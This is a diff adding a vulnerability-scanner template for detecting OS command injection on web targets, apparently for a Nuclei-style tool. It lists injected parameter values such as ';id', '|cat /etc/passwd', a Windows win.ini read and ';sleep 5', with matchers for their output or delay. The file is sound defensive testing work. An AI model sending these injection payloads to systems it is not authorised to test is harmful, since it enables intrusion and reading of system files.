@@ -1,0 +1,66 @@
+id: whai-command-injection
+
+info:
+  name: OS Command Injection Detection
+  author: whitehat-ai
+  severity: critical
+  description: Detects OS command injection via common parameters
+  tags: command-injection,rce,critical
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?cmd=id"
+      - "{{BaseURL}}/?exec=id"
+      - "{{BaseURL}}/?command=id"
+      - "{{BaseURL}}/?ping=;id"
+      - "{{BaseURL}}/?host=;id"
+      - "{{BaseURL}}/?ip=;id"
+      - "{{BaseURL}}/?file=;id"
+      - "{{BaseURL}}/?dir=;id"
+      - "{{BaseURL}}/?cmd=|id"
+      - "{{BaseURL}}/?host=`id`"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "uid=\\d+\\(\\w+\\)\\s+gid=\\d+"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?cmd=cat+/etc/passwd"
+      - "{{BaseURL}}/?exec=type+C:\\windows\\win.ini"
+      - "{{BaseURL}}/?host=|cat+/etc/hostname"
+      - "{{BaseURL}}/?ping=|cat+/etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[fonts\\]"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?host=;sleep+5"
+      - "{{BaseURL}}/?cmd=;sleep+5"
+      - "{{BaseURL}}/?ping=|sleep+5"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
